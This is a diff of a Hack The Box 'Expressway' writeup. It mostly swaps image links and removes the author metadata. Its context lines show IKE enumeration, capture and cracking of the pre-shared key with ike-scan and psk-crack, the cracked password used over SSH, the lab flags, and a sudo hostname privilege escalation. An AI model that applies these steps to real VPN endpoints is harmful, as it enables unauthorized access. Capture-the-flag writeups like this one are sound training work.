@@ -1,13 +1,6 @@
 
 # Expressway — Hack The Box Writeup
 
-**Author:** Muhil M  
-**Category:** Linux 
-**Lab Difficulty:** Easy
-**Date:** 17/11/2025  
-**Status:** Solved
-tags: [WRITEUP]
-
 ---
 
 ## • TLDR Summary
@@ -49,7 +42,7 @@ PORT   STATE SERVICE VERSION
 
 Only SSH is exposed.
 
-![[Pasted image 20251116164142.png]]
+![](attachment/bdd7ddb1ea3a495dbd5fe30eb078c7e9.png)
 
 ---
 
@@ -67,7 +60,7 @@ sudo nmap -sU -oN expressway_udp.nmap 10.10.11.87 -T5
 500/udp open isakmp
 ```
 
-![[Pasted image 20251116170734.png]]
+![](attachment/31cd86eee8623ef0733088e89dd62485.png)
 
 A faster targeted UDP scan:
 
@@ -81,7 +74,7 @@ Output:
 500/udp open isakmp
 ```
 
-![[Pasted image 20251116170842.png]]
+![](attachment/fad11a2c9a6cac9f383d6880c4d10470.png)
 
 UDP/500 (ISAKMP/IKE) is the key service.
 
@@ -103,7 +96,7 @@ ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
 
 This reveals the username **ike**.
 
-![[Pasted image 20251116171313.png]]
+![](attachment/dc6e8c0b69365e62cf19a057e874d86d.png)
 
 ---
 
@@ -116,7 +109,7 @@ sudo ike-scan -A 10.10.11.87 --pskcrack=ike.psk
 head -c 200 ike.psk
 ```
 
-![[Pasted image 20251116171601.png]]
+![](attachment/d910c16b7b9818a08488e1081dca5b77.png)
 
 Crack the PSK using `psk-crack` and the rockyou wordlist:
 
@@ -130,7 +123,7 @@ psk-crack -d /tmp/rockyou.txt ike.psk | tee psk_crack_output.txt
 key "freakingrockstarontheroad" matches SHA1 hash ...
 ```
 
-![[Pasted image 20251116172600.png]]
+![](attachment/03928861c2dd60f2455b7a41c5dd7189.png)
 
 Password found:
 
@@ -148,7 +141,7 @@ Now use the identity `ike` and the cracked PSK as password:
 ssh ike@10.10.11.87
 ```
 
-![[Pasted image 20251116173242.png]]
+![](attachment/02bb3ae1a0153d8ff8c4a7f2709d1c27.png)
 
 Login successful.
 
@@ -174,7 +167,7 @@ user flag: f4ed77b079e65d3a0f328aa79acfd57c
 
 User flag displayed:
 
-![[Pasted image 20251116173801.png]]
+![](attachment/2d1f063a6ac7675ec74929cea4a82ad6.png)
 
 ---
 
@@ -188,7 +181,7 @@ which sudo
 sudo -l
 ```
 
-![[Pasted image 20251116174450.png]]
+![](attachment/8f32b747c8863fe8823476de6542562c.png)
 
 Key observations:
 
@@ -216,7 +209,7 @@ GET http://offramp.expressway.htb
 
 This internal hostname is accepted by the custom sudo’s `-h` parameter.
 
-![[Pasted image 20251116174859.png]]
+![](attachment/527c2d1d5d5d23e0c178bd3ca5699e79.png)
 
 ---
 
@@ -244,7 +237,7 @@ root
 7bce1fefd843c173b7824252b51e36c6
 ```
 
-![[Pasted image 20251116175331.png]]
+![](attachment/af5f0a611b0e6b16a6dbbdc2e036e8fd.png)
 
 Root flag:
 
